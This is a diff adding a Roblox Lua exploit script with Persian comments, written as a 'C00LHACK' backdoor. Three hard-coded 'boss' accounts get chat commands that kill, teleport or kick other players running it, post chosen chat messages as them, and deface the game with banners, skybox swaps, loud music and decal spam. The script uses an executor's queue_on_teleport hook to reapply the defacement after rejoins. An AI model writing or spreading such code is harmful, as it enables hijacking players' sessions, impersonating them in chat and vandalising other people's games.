@@ -1,0 +1,326 @@
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local SoundService = game:GetService("SoundService")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- ==============================================================
+-- 👑 لیست رئیس‌ها
+-- ==============================================================
+local Bosses = {
+    "C00LH4CK1124",
+    "Ssukuna_robloxx", 
+    "C00LGAME1412"   
+}
+
+local ImageAliases = {
+    ["c00lkidd"] = "158118263",
+    ["c00lhack"] = "122714132204276"
+}
+
+-- جدول موزیک‌ها
+local MusicAliases = {
+    ["c00lkidd"] = {id = "104181508980428", volume = 10, pitch = 0.22},
+    ["theme"] = {id = "85390427326662", volume = 10, pitch = 0.16}
+}
+
+-- متغیرهای وضعیت فعلی
+local currentSkyId = nil
+local currentMusicId = nil
+local currentMusicVol = 10
+local currentMusicPitch = 1
+local currentDecalId = nil
+local isTimeLocked = false
+local timeConnection = nil
+
+-- تابع قفل کردن زمان روی ساعت 12
+local function enableTimeLock()
+    isTimeLocked = true
+    if timeConnection then timeConnection:Disconnect() end
+    timeConnection = RunService.Heartbeat:Connect(function()
+        Lighting.ClockTime = 12
+    end)
+end
+
+-- تابع هوشمند برای تمدید صف تلپورت و ریجوین
+local function updateQueue()
+    local queueFunc = queue_on_teleport or (syn and syn.queue_on_teleport)
+    if not queueFunc then return end
+
+    local persistentCode = string.format([[
+        -- صبر کردن تا لود کامل بازی بعد از ریجوین برای جلوگیری از ارور
+        task.spawn(function()
+            if not game:IsLoaded() then
+                game.Loaded:Wait()
+            end
+            task.wait(1.5) -- تأخیر کوتاه برای ثبات کامل لایتینگ و مپ
+
+            local Lighting = game:GetService("Lighting")
+            local SoundService = game:GetService("SoundService")
+            local Workspace = game:GetService("Workspace")
+            local RunService = game:GetService("RunService")
+
+            -- قفل کردن زمان روی 12
+            if %s then
+                RunService.Heartbeat:Connect(function()
+                    Lighting.ClockTime = 12
+                end)
+            end
+
+            -- حذف و مسدود کردن اتمسفر و ابرهای پیش‌فرض بدون ارور دادن
+            local function clearAtmosphere()
+                for _, v in ipairs(Lighting:GetChildren()) do
+                    if v:IsA("Atmosphere") or v:IsA("Clouds") or v:IsA("PostEffect") then
+                        pcall(function() v:Destroy() end)
+                    end
+                end
+            end
+            clearAtmosphere()
+            Lighting.ChildAdded:Connect(function(child)
+                if child:IsA("Atmosphere") or child:IsA("Clouds") or child:IsA("PostEffect") then
+                    task.defer(function()
+                        pcall(function() child:Destroy() end)
+                    end)
+                end
+            end)
+
+            -- اعمال اسکای‌باکس با پایداری کامل
+            local skyId = "%s"
+            if skyId ~= "" then
+                local function applySky()
+                    local sky = Lighting:FindFirstChildOfClass("Sky")
+                    if not sky then
+                        sky = Instance.new("Sky")
+                        sky.Parent = Lighting
+                    end
+                    local textureUrl = "rbxassetid://" .. skyId
+                    sky.SkyboxBk = textureUrl
+                    sky.SkyboxDn = textureUrl
+                    sky.SkyboxFt = textureUrl
+                    sky.SkyboxLf = textureUrl
+                    sky.SkyboxRt = textureUrl
+                    sky.SkyboxUp = textureUrl
+                end
+                applySky()
+                Lighting.ChildAdded:Connect(function(child)
+                    if child:IsA("Sky") then
+                        applySky()
+                    end
+                end)
+            end
+
+            -- اعمال موزیک
+            local musicId = "%s"
+            if musicId ~= "" then
+                local sound = SoundService:FindFirstChild("AdminMusic")
+                if not sound then
+                    sound = Instance.new("Sound")
+                    sound.Name = "AdminMusic"
+                    sound.Parent = SoundService
+                end
+                sound.SoundId = "rbxassetid://" .. musicId
+                sound.Volume = %f
+                sound.Looped = true
+                sound.PlaybackSpeed = %f
+                sound:Play()
+            end
+
+            -- اعمال دکال‌اسپم بعد از ریجوین روی پارت‌های فعلی و جدید
+            local decalId = "%s"
+            if decalId ~= "" then
+                local textureUrlStr = "rbxassetid://" .. decalId
+                local faces = {
+                    Enum.NormalId.Front, Enum.NormalId.Back, 
+                    Enum.NormalId.Top, Enum.NormalId.Bottom, 
+                    Enum.NormalId.Left, Enum.NormalId.Right
+                }
+                
+                for _, obj in pairs(Workspace:GetDescendants()) do
+                    if obj:IsA("BasePart") then
+                        for _, face in ipairs(faces) do
+                            local decal = Instance.new("Decal")
+                            decal.Texture = textureUrlStr
+                            decal.Face = face
+                            decal.Parent = obj
+                        end
+                    end
+                end
+
+                Workspace.DescendantAdded:Connect(function(obj)
+                    if obj:IsA("BasePart") then
+                        for _, face in ipairs(faces) do
+                            local decal = Instance.new("Decal")
+                            decal.Texture = textureUrlStr
+                            decal.Face = face
+                            decal.Parent = obj
+                        end
+                    end
+                end)
+            end
+        end)
+    ]], tostring(isTimeLocked), tostring(currentSkyId or ""), tostring(currentMusicId or ""), currentMusicVol, currentMusicPitch, tostring(currentDecalId or ""))
+
+    pcall(function()
+        queueFunc(persistentCode)
+    end)
+end
+
+-- ==============================================================
+
+local function onBossChatted(speaker, message)
+    local args = string.split(message, " ")
+    local cmd = string.lower(args[1]) 
+    
+    if cmd == ".bring" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            if speaker and speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
+                end
+            end
+        end
+        
+    elseif cmd == ".kill" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
+            end
+        end
+        
+    elseif cmd == ".kick" and args[2] == "users" then
+        if not table.find(Bosses, LocalPlayer.Name) then
+            LocalPlayer:Kick("You have been kicked by the C00LHACK.")
+        end
+        
+    elseif cmd == ".chat" and args[2] == "users" then
+        local textToSay = string.sub(message, 13)
+        if textToSay ~= "" and not table.find(Bosses, LocalPlayer.Name) then
+            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                TextChatService.TextChannels.RBXGeneral:SendAsync(textToSay)
+            elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
+                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(textToSay, "All")
+            end
+        end
+        
+        elseif cmd == ".notify" then
+        	local Hint = Instance.new("Hint")
+local msg = Instance.new("Message")
+Hint.Parent = Workspace
+msg.Parent = Workspace
+Hint.Text = "THIS GAME DESTROYED BY C00LHACK"
+msg.Text = "THIS GAME DESTROYED BY C00LHACK"
+        
+    elseif cmd == ".skybox" and args[2] then
+        local alias = string.lower(args[2]) 
+        local id = ImageAliases[alias]
+        
+        if id then
+            currentSkyId = id
+            enableTimeLock()
+            
+            -- حذف فوری اتمسفر و ابرها در بازی جاری
+            for _, v in ipairs(Lighting:GetChildren()) do
+                if v:IsA("Atmosphere") or v:IsA("Clouds") or v:IsA("PostEffect") then
+                    pcall(function() v:Destroy() end)
+                end
+            end
+            
+            local sky = Lighting:FindFirstChildOfClass("Sky")
+            if not sky then
+                sky = Instance.new("Sky")
+                sky.Parent = Lighting
+            end
+            local textureUrl = "rbxassetid://" .. id
+            sky.SkyboxBk = textureUrl
+            sky.SkyboxDn = textureUrl
+            sky.SkyboxFt = textureUrl
+            sky.SkyboxLf = textureUrl
+            sky.SkyboxRt = textureUrl
+            sky.SkyboxUp = textureUrl
+            
+            updateQueue()
+        end
+        
+    elseif cmd == ".music" and args[2] then
+        local alias = string.lower(args[2])
+        local musicData = MusicAliases[alias]
+        
+        if musicData then
+            currentMusicId = musicData.id
+            currentMusicVol = musicData.volume
+            currentMusicPitch = musicData.pitch
+            
+            local sound = SoundService:FindFirstChild("AdminMusic")
+            if not sound then
+                sound = Instance.new("Sound")
+                sound.Name = "AdminMusic"
+                sound.Parent = SoundService
+            end
+            sound.SoundId = "rbxassetid://" .. musicData.id
+            sound.Volume = musicData.volume
+            sound.Looped = true
+            sound.PlaybackSpeed = musicData.pitch
+            sound:Play()
+            
+            updateQueue()
+        end
+        
+    elseif cmd == ".decalspam" and args[2] then
+        local alias = string.lower(args[2])
+        local id = ImageAliases[alias]
+        
+        if id then
+            currentDecalId = id
+            local textureUrlStr = "rbxassetid://" .. id
+            local faces = {
+                Enum.NormalId.Front, Enum.NormalId.Back, 
+                Enum.NormalId.Top, Enum.NormalId.Bottom, 
+                Enum.NormalId.Left, Enum.NormalId.Right
+            }
+            
+            for _, obj in pairs(Workspace:GetDescendants()) do
+                if obj:IsA("BasePart") then
+                    for _, face in ipairs(faces) do
+                        local decal = Instance.new("Decal")
+                        decal.Texture = textureUrlStr
+                        decal.Face = face
+                        decal.Parent = obj
+                    end
+                end
+            end
+
+            Workspace.DescendantAdded:Connect(function(obj)
+                if obj:IsA("BasePart") then
+                    for _, face in ipairs(faces) do
+                        local decal = Instance.new("Decal")
+                        decal.Texture = textureUrlStr
+                        decal.Face = face
+                        decal.Parent = obj
+                    end
+                end
+            end)
+            
+            updateQueue()
+        end
+    end
+end
+
+-- ==============================================================
+
+local function checkPlayer(player)
+    if table.find(Bosses, player.Name) then
+        player.Chatted:Connect(function(message)
+            onBossChatted(player, message)
+        end)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    checkPlayer(player)
+end
+
+Players.PlayerAdded:Connect(checkPlayer)
